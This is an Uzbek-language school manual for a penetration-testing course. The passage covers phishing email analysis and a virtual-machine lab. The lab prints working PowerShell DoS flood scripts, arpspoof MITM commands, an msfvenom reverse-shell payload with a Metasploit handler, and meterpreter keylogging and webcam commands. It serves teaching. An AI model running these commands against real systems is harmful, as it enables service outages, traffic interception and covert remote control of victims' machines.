@@ -1,0 +1,3611 @@
+OʻZBEKISTON RESPUBLIKASI  RAQAMLI TEXNOLOGIYALAR VAZIRLIGI HUZURIDAGI
+“RAQAMLI TA’LIMNI RIVOJLANTIRISH MARKAZI” DM
+“MUHAMMAD AL-XORAZMIY VORISLARI” TIZIMI ASOSIDA TASHKIL ETILADIGAN MAXSUS GURUHLAR UCHUN 
+KIBERXAVFSIZLIK (PENETRATION TESTING VA ETHICAL HACKING) YO‘NALISHI BO‘YICHA USLUBIY KO‘RSATMA
+(10-SINFLAR UCHUN)
+1-QISM
+
+
+
+
+
+
+
+
+Toshkent-2026
+KIBERXAVFSIZLIK (PENETRATION TESTING VA ETHICAL HACKING) YO‘NALISHI BO‘YICHA O‘QUV QO‘LLANMA
+(10-SINFLAR UCHUN)
+1-QISM
+
+
+
+
+
+
+
+Ushbu kitob kiberxavfsizlikni endi o‘rgana boshlayotganlar uchun ham, amaliy tajribasini mustahkamlashni istayotgan mutaxassislar uchun ham qo‘llanma vazifasini bajaradi. Unda asosiy nazariy tushunchalar, real hujum ssenariylari, amaliy mashqlar va zamonaviy vositalardan foydalanish bo‘yicha bosqichma-bosqich ko‘rsatmalar jamlangan. Qo‘llanmaning maqsadi - o‘quvchini nafaqat kiberhujumlar qanday amalga oshirilishini tushunadigan, balki ularning oldini olish strategiyalarini ham puxta biladigan professionallarga aylantirishdir. 
+
+
+
+
+
+
+
+Muharrir: Ishniyazov O. Dizayner: Aliqulov A.
+
+MUNDARIJA
+	Kirish .................................................................................................................	5
+I bob.	Kiberxavfsizlikka kirish .....................................................................	9
+1.1.	Fishing hujumlari va email sarlavhalarini tahlil qilish ................................	9
+1.2.	Kiberhujumlar: DoS, MITM va zararli dasturlar .........................................	17
+1.3.	Zaif parollar va ochiq portlarni aniqlash ....................................................	25
+1.4.	Raqamli gigiena va ijtimoiy media xavfsizligi ............................................	29
+II bob.	Kompyuter tarmoqlari va Internet xavfsizligi ...................................	39
+2.1.	Wireshark bilan tarmoq paketlarini tahlil qilish ..........................................	40
+2.2.	Ping va traceroute buyruqlari bilan tarmoqni tahlil qilish ...........................	45
+2.3.	IP-manzillash va qism tarmoqlar (subnets) ...............................................	51
+2.4.	Tarmoqlararo ekran va filtrlash .................................................................	58
+2.5.	VPN sozlash: Windows va WireGuard .....................................................	67
+2.6.	Tarmoqlarda VPN qurish va shifrlash .......................................................	74
+III bob.	Operatsion tizimlar va fayl xavfsizligi ..............................................	83
+3.1.	Windows va Linux xavfsizligi ....................................................................	83
+3.2.	Fayl tizimlari va foydalanishlarni boshqarish ............................................	91
+3.3.	Operatsion tizim jurnallari va auditlash .....................................................	99
+3.4.	Secure Boot va tizim yangilanishlari .........................................................	104
+3.5.	Foydalanuvchi qayd yozuvi va parollar siyosati ........................................	110
+IV bob.	Kriptografiya asoslari .......................................................................	115
+4.1.	Kriptografiyaga kirish ................................................................................	115
+4.2.	Simmetrik va ochiq kalitli shifrlash algoritmlari .........................................	126
+4.3.	Xesh funksiyalar .......................................................................................	138
+4.4.	Kriptografik algoritmlardan real hayotda foydalanish ................................	144
+4.5.	HTTPS va SSL/TLS sertifikatlarini tekshirish ............................................	152
+4.6.	Parol xeshlash va brute force hujumlari ....................................................	158
+V bob.	Web xavfsizlik va ethical hacking asoslari ......................................	164
+5.1.	Web saytlar qanday ishlaydi? ...................................................................	164
+5.2.	Keng tarqalgan web zaifliklar ....................................................................	175
+5.3.	XSS (Cross-Site Scripting) hujumlari ........................................................	180
+5.4.	Ethical hacking va qonuniy asoslar ...........................................................	186
+5.5.	Websayt xavfsizligi vositalari ....................................................................	196
+5.6.	OWASP TOP 10 zaifliklari ........................................................................	201
+5.7.	Xavfsiz web forma yaratish (PHP) ............................................................	208
+	Foydalanilgan adabiyotlar ro'yxati ......................................................................	213
+ 
+
+KIRISH
+Bugungi kunda raqamli texnologiyalar jamiyatning barcha sohalariga chuqur singib borar ekan, axborot xavfsizligini ta’minlash global miqyosdagi eng dolzarb masalalardan biriga aylanmoqda. Tarmoqlar, operatsion tizimlar, web-ilovalar, simsiz texnologiyalar, bulutli xizmatlar hamda buyumlar interneti qurilmalarining keng qo‘llanilishi kiberxavfsizlik tahdidlarining ko‘lami va murakkabligini keskin oshirmoqda. Shu sababli zamonaviy axborot tizimlarini himoyalash nafaqat nazariy bilimlarni, balki real hujum ssenariylarini tushunish, zaifliklarni aniqlash va ularni bartaraf etish bo‘yicha chuqur amaliy ko‘nikmalarni talab etadi. Penetration testing va etik xakerlik kiberxavfsizlikni ta’minlashning muhim yo‘nalishlari bo‘lib, ular axborot tizimlaridagi zaifliklarni hujumchilar foydalanishidan avval aniqlash imkonini beradi. Bugungi kunda malakali kiberxavfsizlik mutaxassislariga bo‘lgan ehtiyoj keskin ortib borayotgan bo‘lsada, amaliy tajribaga ega kadrlar yetishmovchiligi saqlanib qolmoqda. Shu bois kiberxavfsizlik bo‘yicha ta’lim jarayonini amaliy laboratoriya ishlari asosida tashkil etish, o‘quvchilarda tizimli fikrlash, tahlil qilish va real muammolarni hal etish ko‘nikmalarini shakllantirish muhim ahamiyat kasb etadi.
+Ushbu uslubiy ko‘rsatma kiberxavfsizlikni endi o‘rgana boshlayotganlar uchun ham, amaliy tajribasini mustahkamlashni istayotgan mutaxassislar uchun ham qo‘llanma vazifasini bajaradi. Unda asosiy nazariy tushunchalar, real hujum ssenariylari, amaliy mashqlar va zamonaviy vositalardan foydalanish bo‘yicha bosqichma-bosqich ko‘rsatmalar jamlangan. Maqsad - o‘quvchini nafaqat kiberhujumlar qanday amalga oshirilishini tushunadigan, balki ularning oldini olish strategiyalarini ham puxta biladigan professionallarga aylantirishdir.
+Uslubiy ko‘rsatmaning birinchi bobida axborot xavfsizligining asosiy tushunchalari, nima uchun kundalik raqamli hayotda kiberxavfsizlikning muhimligi, axborot xavfsizligida inson omili, kibertahdid, uning turlari kabi mavzular bo‘yicha umumiy tushunchalar beriladi. Bundan tashqari, o‘quvchilarda kibertahdidlarni aniqlash, hujumlarni tasniflash, xavfsizlik zaifliklarini topish va raqamli gigiena amaliyotlarini shakllantirish, fishing xabarlarini tahlil qilish, DoS/MITM hujumlarini tasniflash, zaif parollar va ochiq portlarni aniqlash, shuningdek, xavfsiz parol yaratish va ijtimoiy media xavfsizligi ko‘nikmalarini rivojlantirish, kibermakonning asosiy xavf-xatarlaridan himoyalanish kabi fikrlash tushunchalari nazariy va amaliy jihatdan tushuntiriladi.
+Uslubiy ko‘rsatmaning ikkinchi bobida tarmoq tushunchasi, uning turlari, tarmoq qatlamlarini o‘rganish, kuzatuvchi marshrutlar, IP sozlamalari, tarmoqlararo ekran vositalari, VPN aloqalari va tarmoq hujumlarini simulyatsiya qilish ko‘nikmalarini shakllantirish, Wireshark, traceroute/ping buyruqlari va VPN o‘rnatish, tarmoq protokollarini tahlil qilish, himoya choralarini amalga oshirish va hujumlardan himoyalanish kabi masalalar nazariy va amaliy jihatidan tushuntiriladi.
+Uchinchi bobda operatsion tizim tushunchasi, Windows/Linux OT xavfsizlik mexanizmlari, fayl tizimlari, foydalanuvchi turlari, OT fundamental buyruqlari, imtiyozlarni boshqarish, foydalanuvchilarni boshqarish, fayllarni shifrlash va xavfsiz Boot/yangilanishlarni o‘rganish ko‘nikmalari shakllantiriladi. Laboratoriya muhitida Linux OTda fayl imtiyozlarini o‘zgartirish, parol siyosatini o‘rnatish, shifrlash/deshifrlash va BIOS xavfsizligi, operatsion tizimning hodisalarni qaydlash jurnallari, ular asosida tahdidlarni aniqlash, Windows OTda foydalanuvchilarni yaratish, o‘chirish, ular uchun parollar siyosatini o‘rnatish kabi masalalar bo‘yicha nazariy va amaliy bilimlar berilgan.
+To‘rtinchi bob kriptografiyaning asosiy tushunchalari, sodda shifrlar, fayllarni xeshlash, raqamli sertifikatlar yaratish, HTTPS tekshiruvi va parolni hisoblash ko‘nikmalarini shakllantirishga qaratilgan. Shuningdek, matematik fundamental bilimlar, o‘rniga qo‘yish shifrlari, xesh funksiyalari, elektron raqamli imzo va SSL/TLS sertifikatlari tahlili orqali o‘quvchilar ma’lumotlarning maxfiyligi, va yaxlitligini ta’minlash usullarini o‘zlashtiradilar.
+Beshinchi bobda web saytlar qanday ishlashi, web tizimlarda keng tarqalgan zaifliklar, web so‘rovlarni tahlil qilish, SQL inyeksiya hujumlari, XSS hujumlari, pentest simulyatsiyasi, zaifliklarni skanerlash va bartaraf etish, shuningdek, xavfsiz web formalari yaratish, OWASP ZAP kabi vositalar yordamida etik razvedka va zaifliklarni baholash, web-ilovalardagi xavf-xatarlarni aniqlash va himoyalash usullari nazariy va amaliy jihatdan tushuntiriladi.
+Oltinchi bobda Wi-Fi trafigini tahlil qilish, qalbaki boshqaruv nuqtalarini o‘rnatish, Nmap/OpenVAS vositalaridan foydalanish, zaifliklarni skanerlash, parolni aniqlash va Wi-Fi xavfsizligini testlash ko‘nikmalari shakllantiriladi. Shuningdek, ushbu bobda John the Ripper kabi vositalar orqali simsiz tarmoq hujumlarini simulyatsiya qilish va himoyalanish usullari haqida nazariy va amaliy ma’lumotlar keltirilgan.
+Yettinchi bobda fishing xabarlarini tahlil qilish, ogohlantirish plakatlari yaratish, raqamli izni kuzatish, ijtimoiy media xavfsizlik sozlanmalari va shaxsiy xavfsizlik rejalarini ishlab chiqish, haqiqiy va yolg‘on xabarlarni aniqlash, shaxsiy ma’lumotlarni boshqarish va internetda xavfsiz xatti-harakatlarni amalga oshirish bo‘yicha tavsiyalar keltirilgan.
+Sakkizinchi bobda zararli dasturlar, ularni yaratishdan asosiy maqsad, zararli xatti-harakatlarni kuzatish, antivirus o‘rnatish, VirtualBoxda xavfsiz muhit yaratish, ma’lumotlarni qayta tiklash, operatsion tizimni qayta tiklash va shubhali jarayonlarni aniqlash ko‘nikmalari shakllantiriladi. Shuningdek, Windows Defender kabi vositalar orqali zararli dasturlarni aniqlash va testlash, ma’lumotlarni zaxira nusxalash, qayta tiklash usullari haqida ma’lumotlar berilgan.
+To‘qqizinchi bobda raqamli kriminalistika asoslari, kriminalistik obraz yaratish, o‘chirilgan fayllarni tiklash, vaqt jadvaliga bo‘ladigan hujumlarni tahlil qilish, bo‘shliq xotira tahlili va xotiradagi ichki tahdidlarni aniqlash, disklarni klonlash, fayllarni tiklash va dalillarni saqlash usullariga oid nazariy va amaliy ma’lumotlar keltirilgan.
+So‘ngi bobda xavfsiz tarmoq qurish va unda xavfsizlikni ta’minlash, suqilib kirish testini amalga oshirish, Capture the Flag (CTF) musobaqalari haqida bilimlar hamda web va parolga qaratilgan CTF masalalarini yechish ko‘nikmalarini shakllantirishga oid ma’lumotlar berilgan.
+
+
+
+
+
+
+1-bob haqida umumiy ma’lumot
+Ushbu bobda axborot xavfsizligining asosiy tushunchalari, nima uchun kundalik raqamli hayotda kiberxavfsizlikning muhimligi, axborot xavfsizligida inson omili, kibertahdid, uning turlari, amalga oshirishdagi motivatsiyalar, CIA uchligi: Confidentiality (konfidensiallik), Integrity (yaxlitlik), Availability (foydalanuvchanlik) kabi mavzular bo‘yicha umumiy tushunchalar beriladi. Bundan tashqari, xavfsizlikni taminlash bo‘yicha mutaxassislarni tayyorlash, axborotni himoyalashda tizimli fikrlash, ham hujumchi ham himoyachi kabi fikrlash tushunchalari nazariy va amaliy jihatdan tushuntiriladi.
+1.1. Fishing hujumlari va email sarlavhalarini tahlil qilish
+O‘quvchilarda fishing ko‘rinishidagi elektron pochta xabarlarini va haqiqiy firibgarlik holatlarini tahlil qilish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda fishing ko‘rinishidagi elektron pochta xabarlarini va haqiqiy firibgarlik holatlarini tahlil qilish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Thunderbird elektron pochta mijoz dasturi;
+	•	MX Toolbox (onlayn) vositasi;
+	•	VirusTotal (onlayn) skaneri.
+	•	Thunderbird elektron pochta mijoz dasturi;
+	•	MX Toolbox (onlayn) vositasi;
+	•	VirusTotal (onlayn) skaneri.
+Ishning bajarish tartibi
+Fishing (ing., Phishing) – bu firibgarlar tomonidan yuboriladigan soxta elektron xabarlar bo‘lib, ularda foydalanuvchilar shaxsiy ma’lumotlarini (parol, bank kartasi) oshkor qilishga majburlanadi. Umumiy belgilari: yuboruvchining noma’lumligi, shoshilinch talablarlarni mavjudligi (masalan, “darhol kiriting”), grammatik xatolarni ko‘pligi, soxta havolalarni mavjudligi. Haqiqiy fishing xabarlari bilan ishlash xavfli bo‘lishi mumkinligi bois, ularni tekshirish xavfsiz muhitda (virtual mashina yoki sandbox) o‘tkazilishi kerak. Bundan tashqari, tahlilni amalga oshirganda hech qachon haqiqiy fishing havolalarini ochmaslik yoki shaxsiy ma’lumotlarni kiritmaslik talab etiladi.
+Amaliy mashg‘ulotni olib borish uchun quyidagi dasturlarni sozlash talab etiladi:
+	•	Thunderbird (elektron pochta mijozi) dasturi. Haqiqiy yoki simulyatsiya qilingan xabarlarni ochish va tahlil qilish uchun foydalaniladi.
+	•	MX Toolbox (onlayn) vositasi. Email sarlavhalarini (headers) tahlil qilish uchun (yuboruvchi IP, domain haqiqiyligini tekshirish) foydalaniladi.
+	•	VirusTotal (onlayn) skaneri. Fayllar yoki havolalarni zararli yoki emasligini aniqlash uchun foydalaniladi.
+	•	PhishTank (onlayn baza). Ma’lum fishing havolalarini tekshirish uchun foydalaniladi.
+Soxta fishing xabarlar aslida qanday ko‘rinishda bo‘lishiga oid misol quyida keltirilgan.
+From: “UzSanoat Bank” <support@uzsanoat-secure.com>
+To: student@example.com
+Subject: Hisobingiz bloklandi — Darhol qayta tiklang
+Date: Mon, 10 Nov 2025 09:12:01 +0500
+Hurmatli mijoz,
+Sizning hisobingizda shubhali harakatlar aniqlandi. Xavfsizlik uchun hisobingizni hozirgacha faollashtirish uchun iltimos quyidagi havolani bosib, bank ma’lumotlaringizni tasdiqlang:
+http://uzsanoat-bank.verify-secure-login.com/confirm
+Agar 24 soat ichida tasdiqlanmasa, hisobingiz bloklanadi.
+Rahmat.
+Ushbu xabarda yuboruvchi domeni uzsanoat-secure.com va manzildagi “UzSanoat Bank” nomi asl bank domeniga o‘xshash bo‘lsada, e’tibor qilinsa farqlarni aniqlash mumkin. Linkdagi verify-secure-login.com domen ichida “uzsanoat-bank” subdomeni chalg‘ituvchi nom hisoblanadi. Xabar favqulodda psixologik ta’sir ko‘rsatishni maqsad qilgan ( ya’ni, “24 soat Ichida” jumlasi bor).
+
+From: “HR Recruit” <recruit@greatitjobs.co>
+To: student@example.com
+Subject: Sizga ish taklifi — hujjatni yuklab oling
+Date: Tue, 11 Nov 2025 14:03:45 +0500
+Assalomu alaykum,
+Sizning rezyumeingiz bizga yoqdi. Iltimos ilovadagi “testvirus.zip” faylini ochib, ichidagi hujjatni to‘ldiring va qayta yuboring.
+Hurmat bilan, IT HR Team
+Yuqorida keltirilgan ikkinchi misolni qaratlik. Ushbu xabarda kutilmagan ilova .zip fayli mavjud, bu esa fayl ichida .exe yoki .scr ko‘rinishidagi zararli dasturlar bo‘lishi ehtimolini ko‘rsatadi. Bundan tashqari, yuboruvchi domeni ham noma’lum yoki shubhali.
+Kelgan xabarlarni fishing ekanligini aniqlash uchun email sarlavhalarni tahlil qilish, havolalarni tekshirish lozim. Quyida ushbularni amalga oshirish ketma-ketliklari keltirilgan.
+1. Thunderbird dasturini o‘rnatish va tekshirish
+Thunderbird dasturiy vositasi elektron pochta xabarlarini ochib, sarlavhalarni tahlil qilish va fishing belgilarini aniqlash imkonini beradi. Interfeysning soddaligi tufayli undan foydalanish qulay hisoblanadi (1.1-rasm).
+Dastlab aniqlangan fishing xabari Thunderbird dasturiga import qilinadi. Buning uchun “Local Folders” bo‘limida .eml fayli tanlab olinadi. So‘ngra xabar ochilib, tahlil qilinadi.
+
+1.1-rasm. Thunderbird dasturiy vositasining asosiy menyusi
+Xabarni ochgandan so‘ng, “View  Message Source” orqali sarlavhalar ko‘riladi va yuboruvchi manzili tekshiriladi (masalan, soxta domain).
+
+1.2-rasm. Email sarlavhalarini ko‘rish jarayoni
+Dasturning asosiy oynasida xabar matni, havolalar va qo‘shimchalar namoyon bo‘ladi, URL ni haqiqiylikka tekshirish mumkin bo‘ladi.
+
+1.3-rasm. Attachments bo‘limidagi qo‘shimcha fayllar
+Dasturning “Attachments” bo‘limida qo‘shimcha fayllar ko‘rinsa, ularni ochmasdan VirusTotalda vositasida skaner qilish lozim hisoblanadi.
+2. MX Toolbox vositasi
+MX Toolbox onlayn vositasi email sarlavhalarini tahlil qilish uchun mo‘ljallangan. Buning uchun sarlavhalardan nusxa ko‘chirib, saytga joylashtiradi va “Analyze” tugmasi bosadi.
+
+1.4-rasm. Dasturga pochta xabarini joylashtirish
+Elektron pochta mavzusi “Hisobingiz bloklandi — Darhol qayta tıklang” bo‘lgani bois, undagi “bloklandi”, “darhol”, “faollashtiring” kabi favqulodda talablarni ko‘rish mumkin. 
+
+1.5-rasm. Tahlil natijalari
+“UzSanoat Bank” support@uzsanoat-secure.com manzil ko‘rinishi banknikiga oʻxshash, ammo domen rasmiy bank domenga mutlaqo o‘xshamaydi. Haqiqiy bank domenlari odatda .uz, .com, yoki bank nomi + bank.uz shaklida bo‘ladi. Bu yerda esa uzsanoat-secure.com manzili shubhali, tasodifiy domen. Demak domenni MXToolbox vositasida haqiqiyligini tekshirish lozim (1.6-rasm).
+
+1.6-rasm. Domenni haqiqiyligini tekshirish
+MXToolbox vositasida tekshirish natijasi shuni ko‘rsatdi, bu domen haqiqiy emailda foydalanilmaydi, faqat odamlarni aldash uchun ishlatilgan bo‘lishi mumkin. Bu yerda, SPF - domen nomidan kim xat yubora olishini ko‘rsatadi, DKIM - xatning haqiqiyligini isbotlaydigan raqamli imzo, DMARC - xat soxta bo‘lsa, nima qilish kerakligini belgilaydi.
+Demak, tekshirilgan uzsanoat-secure.com domeni real bank yoki kompaniyaga tegishli emas. Bu domen hech qanday himoya (SPF, DKIM, DMARC) mexanizmiga ega emas va elektron xabarlarni qabul qilmaydi. Shuning uchun bu domen nomidan kelgan xabarlar soxta va fishing bo‘lish ehtimoli juda yuqori.
+Endi xabarda keltirilgan http://uzsanoat-bank.verify-secure-login.com/confirm manzilni, uni ustiga bosmasdan fishing xabar yoki emasligi tekshiriladi. Buning uchun https://urlscan.io/ saytidan foydalanish mumkin. 
+
+1.7-rasm. URL manzil haqiqiyligini tekshirish
+
+1.8-rasm. URL manzilni tekshirish natijalari
+Mazkur holda dastur “HTTP 400 Error — DNS Error: Could not resolve domain” yozuvini chiqargan. Bu muhim xabar bo‘lib, urlscan dasturi saytga ulanish uchun domen manzilini topa olmagani, ya’ni domen serverning IP manzili yo‘qligi yoki domen ro‘yxatdan o‘tmaganini (yo‘q qilingan yoki DNS yozuvlari noto‘g‘ri) anglatadi. Bu holat xabarni fishing ekanligini ko‘rsatadi. Boshqacha aytganda, soxta xabar yuboruvchilar ko‘pincha ishlamaydigan yoki vaqtinchalik (throwaway) domenlardan foydalanadilar.
+3. Virustotal platformasi
+Agar xabar tarkibida yuklab olish uchun fayl ham berilgan bo‘lsa, tarkibida zararli dastur (virus) bo‘lishi mumkinligi bois uni ochishga shoshilmaslik kerak. Faylni ichini ochmasdan uni https://www.virustotal.com/gui/home/upload platformasi orqali oldin tekshirib olish tavsiya etiladi (1.9-rasm).
+
+1.9-rasm. Virustotal platformasi ishchi oynasi
+
+1.10-rasm. Fayl zararli yoki zararsiz ekanligini tekshirish
+VirusTotal ochilganda yuqorida 3 ta menyu ko‘rinadi: File, URL, Search. Faylni tekshirish uchun “File” tugmasi bosiladi. “Choose File” tugmasi bosilib, kompyuterdan tekshirilishi kerak bo‘lgan fayl tanlanadi. Fayl yuklangach, VirusTotal vositasi uni avtomatik ravishda 70 dan ortiq antiviruslar, xavfsizlik tizimlari, sandbox vositalari orqali tekshiradi (1.10-rasm).
+Yuqorida testvirus.zip faylini tekshirish natijasi ko‘rsatildi. VirusTotal.com platformasi yuklangan faylni zararli ekanligi haqida hisobot chiqardi.
+	3 ta haqiqiy fishing xabar oling va Thunderbird yordamida tahlil qiling.
+	•	Natijalarni solishtiring va ehtimoliy xavfsizlikka ta’sirini izohlang.
+	•	VirusTotal va MX Toolbox yordamida o‘zingiz tanlagan email xabarlarini tekshirib ko‘ring va ularning fishing ekanligini baholang.
+Amaliy topshiriqlar
+
+
+	•	3 ta haqiqiy fishing xabar oling va Thunderbird yordamida tahlil qiling.
+	•	Natijalarni solishtiring va ehtimoliy xavfsizlikka ta’sirini izohlang.
+	•	VirusTotal va MX Toolbox yordamida o‘zingiz tanlagan email xabarlarini tekshirib ko‘ring va ularning fishing ekanligini baholang.
+Amaliy topshiriqlar
+
+
+
+1.2. Kiberhujumlar: DoS, MITM va zararli dasturlar
+O‘quvchilarda ssenariylar yordamida turli hujumlarni (DoS, MITM, zararli dastur) tasniflash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda ssenariylar yordamida turli hujumlarni (DoS, MITM, zararli dastur) tasniflash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Virtual mashina;
+	•	Kali Linux OT;
+	•	Wireshark dasturiy vositasi.
+	•	Virtual mashina;
+	•	Kali Linux OT;
+	•	Wireshark dasturiy vositasi.
+Ishning bajarish tartibi
+Kiberhujumlar o‘zlarining maqsadi, usuli va ta’sir darajasiga qarab tasniflanishi mumkin. Asosiy kiberhujum turlariga quyidagilarni kiritish mumkin: 
+DoS (Denial of Service) – nishondagi tizimni resurslar bilan to‘ldirib, foydalanuvchilarga xizmat ko‘rsatishni to‘xtatishni maqsad qiladi. 
+MITM (Man-in-the-Middle) – ikki tomon o‘rtasidagi aloqani uzib, ma’lumotlarni o‘zgartirish yoki o‘qishni maqsad qiladi 
+Zararli dastur (Malware) – virus, troyan, ransomware, spyware kabi dasturlar orqali tizimga zarar yetkazishni maqsad qiladi. 
+Hujumlarni tasniflash uchun trafik tahlil qilinadi, loglar o‘rganiladi, paketlar tuzilishi tekshiriladi. Ssenariylar orqali har bir hujumning belgilari aniqlanadi. Ushbu ma’lumotlar tarmoq vositalari orqali uzatiladigan paketlarni ushlab turish orqali olinadi. Quyida laboratoriyani bajarish ketma-ketligi keltirilgan:
+Virtual muhitni tayyorlash 
+VirtualBox yoki VMware yordamida quyidagi tizimlar o‘rnatiladi (1.11-rasm): 
+	•	Kali Linux (hujumchi) – IP manzil 172.16.7.120;
+	•	Windows 10 (qurbon) – IP manzil 172.16.4.65;
+	•	Ubuntu Server (maqsadli server) – IP manzil 172.16.5.97.
+Tarmoq NAT Network yoki Bridged Adapter rejimida sozlanadi (1.11-rasm).
+
+1.11-rasm. VirtualBoxda 3 ta virtual mashinani yaratish va tarmoqni sozlash
+Windowsda tarmoq hujumlarini amalga oshirish
+Slowloris turidagi hujum (80-portga DoS): buning uchun PowerShell oynasiga administrator huquqi bilan kirib quyidagi kodlarni kiritiladi (1.12-rasm):
+1..500 | ForEach-Object {
+    Start-Job -ScriptBlock {
+        try {
+            $tcp = New-Object System.Net.Sockets.TcpClient
+            $tcp.Connect(“127.0.0.1”, 80)
+            $stream = $tcp.GetStream()
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $writer.WriteLine(“GET / HTTP/1.1`r`nHost: localhost`r`n”)
+            $writer.Flush()
+            Start-Sleep -Seconds 300   # 5 daqiqa ushlab turadi
+        } catch {}
+    }
+}
+Write-Host “500 ta sekin ulanish ochildi – server sekinlashdi!”
+
+1.12-rasm. Windows Powershellda Dos hujumini amalga oshirish
+Natijada bir vaqtning o‘zida takroriy 500 ta sekin so‘rov jo‘natilgani bois, 80-port ishlamay qoldi (1.13-rasm).
+
+1.13-rasm. Hujum natijasi
+HTTPS (443-port) ga DoS hujumi – minglab TLS handshake. Endi yangi powershell oynasiga quyidagi kodlar kiritiladi va Enter tugmasi bosiladi (1.14-rasm): 
+1..1000 | ForEach-Object {
+    Start-Job -ScriptBlock {
+        try {
+            $tcp = New-Object System.Net.Sockets.TcpClient
+            $tcp.Connect(“127.0.0.1”, 443)
+            $ssl = New-Object System.Net.Security.SslStream($tcp.GetStream(), $false, ({$true}))
+            $ssl.AuthenticateAsClient(“localhost”)
+            Start-Sleep -Seconds 60
+        } catch {}
+    }
+}
+Write-Host “1000 ta TLS handshake ochildi – CPU 100% bo‘ladi!”
+
+1.14-rasm. 443-portga DoS hujumi
+Natijada kompyuter CPU bandligi 100 % ga yetadi va mashina sekin ishlay boshlaydi.
+Wireshark vositasi. Wireshark tarmoq trafigini yozib olib, hujum paketlarini tahlil qilish uchun mo‘ljallangan.
+
+1.15-rasm. Wireshark dasturini ishga tushirish va interfeysni tanlash
+MITM hujum ssenariysi. Bunga ko‘ra Kali Linux OTda arpspoof yordamida “ARP poison” holati amalga oshiriladi.
+echo 1 > /proc/sys/net/ipv4/ip_forward 
+sudo arpspoof -i eth0 -t 172.16.5.97 -r 172.16.4.65
+
+1.16-rasm. arpspoof buyrug‘ini ishga tushiradi
+Wireshark vositasidan qurbon va gateway o‘rtasidagi barcha trafikni ko‘rish uchun foydalanish mumkin.
+Bu holatda arpspoof ishlaganda qurbon “Windows”, “Ubuntu server” OTga ulandim deb o‘ylasada, aslida barcha trafik Kali OT orqali o‘tadi. Wireshark ilovasida bu aniq ko‘rinadi, ya’ni ARP paketlari ko‘payadi, HTTP so‘rovlar ochiq matnda keladi. Bu MITM hujumining eng oddiy va xavfli usuli bo‘lib, HTTPS bo‘lmagan saytlarda parollarni o‘g‘irlashda qo‘l keladi.
+
+1.17-rasm. ARP Reply paketlari (arpspoof ishlayotganini ko‘rish)
+Zararli dastur senariysi. Bunga ko‘ra Kali Linux OTda msfvenom yordamida teskari shell (reverse TCP) yaratiladi:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.7.120 LPORT=4444 -f exe > malware.exe
+
+1.18-rasm. msfvenom buyrug‘ini ishga tushirilishi va malware.exe faylini yaratilishi
+Ushbu fayl Windows OTda ishga tushirilganda boshqaruvni hujumchiga, ya’ni Kali OTga olib beradi. Buning uchun Kali OTda msfconsole ni ochib quyidagi buyruqlarni kiritish kerak (1.19-rasm):
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp 
+set LHOST 172.16.7.120 
+exploit
+
+1.19-rasm. Metasploit ochildi va 4444 portida malware.exe faylini ishga tushirilishini kutmoqda
+Kali OT kutish rejimiga o‘tganda Windows OTda malware.exe zararli dasturini ishga tushurish lozim. Zararli dastur ishga tushganda Kali Metasploitda meterpreter sessiyasi ochiladi va Windows OT boshqaruvi hujumchiga o‘tadi (1.20-rasm).
+
+1.20-rasm. Meterpreter sessiyasini ishga tushganligi
+Sinab ko‘rish uchun quyidagi buyruqlarni meterpreterga yozish mumkin (1.21-rasm):
+sysinfo → Windows OT haqida ma’lumot;
+screenshot → Ish stolining skrinshoti;
+webcam_snap → Kamera surati (agar bo‘lsa);
+keyscan_start → Klaviatura bosishlarni yozib boradi;
+keyscan_dump → Yozilganlarni ko‘rsatadi;
+getuid → Hozir qaysi user ekanligini aytadi.
+
+1.21-rasm. Windows OTni Kali OT orqali boshqarish
+	Virtual muhitni sozlang va IP manzillarni aniqlang.
+	•	3 ta hujumni amalda bajaring va Wiresharkda paketlarni tasniflang.
+	•	Tasniflash jadvalini keltiring va himoya choralarini ayting.
+Amaliy topshiriqlar
+
+
+	•	Virtual muhitni sozlang va IP manzillarni aniqlang.
+	•	3 ta hujumni amalda bajaring va Wiresharkda paketlarni tasniflang.
+	•	Tasniflash jadvalini keltiring va himoya choralarini ayting.
+Amaliy topshiriqlar
+
+
+1.3. Zaif parollar va ochiq portlarni aniqlash
+O‘quvchilarda zaif parollar va ochiq portlarni aniqlashni oddiy tizim tekshiruvi yordamida amalga oshirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda zaif parollar va ochiq portlarni aniqlashni oddiy tizim tekshiruvi yordamida amalga oshirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Virtual mashina;
+	•	Hydra dasturi;
+	•	Nmap dasturi.
+	•	Virtual mashina;
+	•	Hydra dasturi;
+	•	Nmap dasturi.
+Ishning bajarish tartibi
+Zaif parollar va ochiq portlar kiberxavfsizlik sohasidagi eng keng tarqalgan zaifliklardan hisoblanadi. Zaif parollar (masalan, “123456”, “admin”, “password”) qo‘pol kuch yoki lug‘atga asoslangan hujumlar orqali oson buziladi. Ochiq portlar esa tizimda keraksiz xizmatlar (FTP, Telnet, SMB, RDP) ishlayotganini bildiradi va ular himoyalanmagan bo‘lsa, ulardan foydalanib tizimdan ruxsatsiz foydalanish mumkin. Zaifliklarni aniqlash uchun Nmap (port skanerlash), Hydra/Medusa (parol buzish), Metasploit (ekspluatatsiya) kabi vositalardan foydalaniladi. Ushbu ma’lumotlar tarmoq vositalari orqali uzatiladigan paketlarni ushlab qolish va tahlil qilish orqali olinadi.
+Virtual muhitni tayyorlash 
+VirtualBox yoki VMware vositasi yordamida quyidagi tizimlar o‘rnatiladi (1.22-rasm): 
+	•	Kali Linux (hujumchi) OT – IP manzil 172.16.4.100;
+	•	Windows 10 (zaif parollar bilan) OT – IP manzil 172.16.4.65.
+Tarmoq NAT Network yoki Internal Network rejimida sozlanadi.
